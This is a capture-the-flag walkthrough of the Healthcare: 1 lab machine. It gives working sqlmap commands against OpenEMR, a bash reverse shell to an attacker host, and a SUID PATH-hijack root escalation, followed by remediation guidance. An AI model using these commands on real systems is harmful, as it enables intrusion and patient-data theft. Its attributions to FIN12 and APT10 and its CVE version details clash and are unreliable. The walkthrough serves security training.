# Healthcare: 1 — Patient Data Breach, Textbook Edition

Healthcare: 1 runs OpenEMR v4.1.0, an open-source electronic medical records system with a well-documented SQL injection vulnerability in its login endpoint. sqlmap dumps the user table, cracked credentials get you admin access, and OpenEMR's PHP configuration file editor lets you drop a reverse shell directly into the application. Once on the box, a SUID binary named `healthcheck` calls `fdisk` without an absolute path, making it a perfect PATH hijacking target for an instant root shell. The irony of a healthcare system being the least healthy thing on the network is not lost. legit.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Healthcare: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/healthcare-1,522/ |
| **Techniques** | Nmap recon, Dirb/Gobuster web enumeration, OpenEMR version fingerprinting, SQLi with sqlmap, admin panel PHP file replacement, PHP reverse shell, lateral movement, SUID binary PATH hijacking |
| **CVEs** | CVE-2018-15140 (OpenEMR 5.0.1 SQLi), CWE-89 (SQL Injection), CWE-732 (Incorrect SUID permissions), CWE-427 (Uncontrolled Search Path Element) |
| **APT Groups** | APT10 (Stone Panda): specifically targets healthcare sector systems for patient data theft and intellectual property; FIN12: exclusively targets healthcare organizations with ransomware, frequently exploiting OpenEMR and similar EMR systems |

---

## Attack Summary

```
netdiscover + nmap → HTTP (80), FTP (21)
  |
  +--> Dirb/Gobuster → /openemr/
          |
          +--> OpenEMR v4.1.0 fingerprint
                  |
                  +--> sqlmap → dump openemr.users → admin:anotheropenmrsuser
                          |
                          +--> Login admin → Files module → edit PHP config
                                  |
                                  +--> Replace with PHP reverse shell → nc listener
                                          |
                                          +--> Shell (www-data) → find medical user creds
                                                  |
                                                  +--> su medical → find SUID healthcheck
                                                          |
                                                          +--> PATH hijack fdisk → root
```

---

## Methodology

1. Host discovery and service enumeration
2. Web directory brute-force to discover OpenEMR installation path
3. OpenEMR version fingerprinting
4. SQL injection with sqlmap against OpenEMR login endpoint
5. Crack extracted credentials
6. Admin login; locate PHP file editor in OpenEMR admin panel
7. Replace PHP config with reverse shell payload
8. Trigger shell; stabilize
9. Lateral move to `medical` user via discovered credentials
10. SUID enumeration; PATH hijack the `healthcheck` binary for root

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.158

nmap -sV -sC -A 192.168.0.158
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.x
80/tcp open  http    Apache httpd 2.4.x
```

HTTP is the primary attack surface. FTP is noted for potential anonymous access.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and OpenEMR Discovery

```bash
dirb http://192.168.0.158/ /usr/share/wordlists/dirb/common.txt
# or
gobuster dir -u http://192.168.0.158/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

Discovery: `/openemr/` — OpenEMR electronic medical records system.

Browse to `http://192.168.0.158/openemr/`. The login page reveals the version in the source or footer:

```bash
curl -s http://192.168.0.158/openemr/ | grep -i "version\|openemr"
# OpenEMR v4.1.0
```

**Alternatively:** Check `http://192.168.0.158/openemr/version.php`

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — SQL Injection via sqlmap

OpenEMR 4.1.0 is vulnerable to SQL injection in the login endpoint. Run sqlmap against it:

```bash
sqlmap -u "http://192.168.0.158/openemr/interface/main/main_screen.php?auth=login&site=default" \
  --data "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=test&languageChoice=1" \
  --dbs

sqlmap -u "http://192.168.0.158/openemr/interface/main/main_screen.php?auth=login&site=default" \
  --data "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=test&languageChoice=1" \
  -D openemr --tables

sqlmap -u "http://192.168.0.158/openemr/interface/main/main_screen.php?auth=login&site=default" \
  --data "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=test&languageChoice=1" \
  -D openemr -T users --dump
```

Dumped credentials:

```
admin:3863efef9ee2bfbc51aea7f5e4e7b4f2 (MD5)
medical:[hash]
```

Crack the MD5:

```bash
echo '3863efef9ee2bfbc51aea7f5e4e7b4f2' > /tmp/emr_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/emr_hash.txt
# admin:anotheropenmrsuser
```

**Real-world note:** OpenEMR is used by over 100,000 healthcare facilities worldwide, handling millions of patient records. CVE-2018-15140 (and related SQLi vulnerabilities in 4.x) allowed unauthenticated access to the patient database. FIN12, the healthcare-focused ransomware group, has used OpenEMR vulnerabilities as an initial access vector in multiple hospital compromises.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 4 — Admin Shell Upload via PHP File Editor

Log in to OpenEMR as admin:

```
http://192.168.0.158/openemr/ → admin:anotheropenmrsuser
```

Navigate to the admin panel's file management functionality. In OpenEMR 4.1.0, the administration panel includes a PHP file editor:

```
Administration → Files (or Configuration)
```

Locate a PHP file that is web-accessible and replace its contents with a reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/[attacker_ip]/4444 0>&1'");
?>
```

Or use the standard php-reverse-shell.php payload.

Start a listener on the attacker:

```bash
nc -lvnp 4444
```

Browse to the modified PHP file to trigger execution. The callback arrives as `www-data`.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Shell Stabilization and Lateral Movement

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Look for credentials in the OpenEMR config files for lateral movement to the `medical` user:

```bash
cat /var/www/html/openemr/sites/default/sqlconf.php
# Contains database credentials

find /home -name "*.txt" -o -name "*.conf" 2>/dev/null
cat /etc/passwd
# medical user exists
```

If credentials for `medical` are found in OpenEMR config or elsewhere:

```bash
su medical
# Password: [found in config]
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1078.003 — Valid Accounts: Local Accounts

---

## Step 6 — SUID PATH Hijacking for Root

Enumerate SUID binaries as `medical`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Critical: `/usr/bin/healthcheck` (or similar path) is SUID root. Inspect what it does:

```bash
strings /usr/bin/healthcheck
# Output includes: fdisk -l
```

The binary calls `fdisk` without an absolute path. This is exploitable via PATH hijacking:

```bash
# Create a fake fdisk in /tmp
echo '#!/bin/bash' > /tmp/fdisk
echo '/bin/bash -p' >> /tmp/fdisk
chmod +x /tmp/fdisk

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
/usr/bin/healthcheck
```

The SUID binary runs `fdisk`, finds `/tmp/fdisk` first due to modified PATH, and executes it with SUID root privileges:

```bash
id
# uid=1001(medical) gid=1001(medical) euid=0(root) groups=1001(medical)

cat /root/root.txt
```

gg. The healthcare system needed a health check itself.

**Real-world note:** PATH hijacking via SUID binaries is a classic Linux privilege escalation technique. Any SUID binary that calls external programs without absolute paths is vulnerable. `strings` on a binary is one of the first post-exploitation enumeration steps for exactly this reason. APT10 has used this technique after compromising Linux healthcare servers.

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable; T1548.001 — Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Method |
|---|---|---|---|
| admin hash | 3863efef9ee2bfbc51aea7f5e4e7b4f2 | openemr.users | sqlmap dump |
| admin credentials | admin:anotheropenmrsuser | Cracked from hash | John rockyou |
| medical credentials | medical:[password] | OpenEMR config / lateral move | sqlmap or config file |
| www-data shell | web process | OpenEMR PHP editor | File replacement |
| Root shell | uid=0 (euid) | healthcheck SUID | PATH hijack fdisk |
| Root flag | {flag} | /root/root.txt | cat |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | OpenEMR SQLi (CVE-2018-15140) exposes patient data | OpenEMR used by 100k+ healthcare facilities; patient records, credentials fully exposed | Patch OpenEMR immediately; WAF rules for EMR login endpoints |
| 2 | Admin panel PHP file editor allows direct RCE | Any PHP file editor in a web admin panel is equivalent to RCE for an admin user | Disable PHP file editing in production; use read-only filesystems for application code |
| 3 | Credentials in application config accessible to web process | PHP config files readable by www-data expose all database credentials | Config files must be outside web root and readable only by the application user |
| 4 | SUID binary calls external program without absolute path | PATH hijacking is a consistent real-world privesc finding | Always use absolute paths in SUID binaries; audit SUID binaries with `strings` |
| 5 | Healthcare data (EMR) treated as low-criticality target | Healthcare records contain PII, PHI, financial data — high-value for ransomware and identity theft | Healthcare systems require MFA, network segmentation, and regular patching per HIPAA |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Active Scanning | Vulnerability Scanning | T1595.002 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Persistence | Server Software Component: Web Shell | T1505.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | Valid Accounts: Local Accounts | T1078.003 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: PATH Interception | T1574.007 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch OpenEMR**: upgrade to a supported, patched version; apply SQL injection mitigations
2. **Disable PHP file editing in admin panels**: never deploy an application with a built-in PHP file editor in production
3. **Move config files outside web root**: application config must be readable only by the application user, not www-data
4. **Remove SUID from healthcheck**: custom SUID binaries should be avoided; if necessary, use absolute paths for all external commands
5. **Implement MFA for OpenEMR admin**: healthcare systems handling PHI must have MFA per HIPAA requirements

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (patch OpenEMR; disable PHP editor)
- **D3-OAM** — Operating System Administrative Management (SUID audit; absolute paths in scripts)
- **D3-PA** — Platform Monitoring (file integrity monitoring on /var/www/html/)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Risk Assessment | Classify OpenEMR as high-criticality asset; assess CVE exposure |
| Protect | Access Control | MFA for all EMR admin access; restrict PHP file editing |
| Protect | Data Security | Encrypt patient data at rest; config files outside web root |
| Detect | Anomalies | Alert on unexpected PHP file modifications; new cron jobs; sqlmap signatures |
| Respond | Response Planning | Patch OpenEMR; rotate all credentials; investigate data exposure |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-2 | Flaw Remediation | Patch OpenEMR; patch management workflow for healthcare systems |
| IA-2(1) | Multi-Factor Authentication | MFA for all OpenEMR admin accounts |
| SC-28 | Protection of Information at Rest | Encrypt PHI at rest; config files with restricted permissions |
| CM-6 | Configuration Settings | No PHP file editing; absolute paths in SUID binaries |
| AC-6 | Least Privilege | Minimum permissions for www-data; remove SUID from custom binaries |

### CISA KEV

OpenEMR SQL injection vulnerabilities are tracked in CISA guidance for healthcare sector (AA20-302A, AA21-321A). CISA specifically calls out EMR systems as high-priority targets for patching. FIN12 ransomware group is named in CISA AA21-321A as actively exploiting healthcare software.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Asset Configuration | MIL2 |

---

## Final Thoughts

Healthcare: 1 is a sobering box. OpenEMR is real software used by real hospitals handling real patient data. CVE-2018-15140 was a real vulnerability in real production systems. FIN12 and APT10 are real groups that have compromised real healthcare organizations using exactly this attack chain.

The box teaches three important lessons beyond the techniques: (1) healthcare systems are high-value targets; (2) unpatched EMR software directly endangers patient privacy; and (3) SUID binaries in healthcare applications call external tools without absolute paths with alarming frequency.

If this box feels routine as a CTF, just remember that the same chain played out in real hospitals, affecting real patients. That is why HIPAA and CISA healthcare guidance exist.

Thanks guys!! (❍ᴥ❍ʋ)
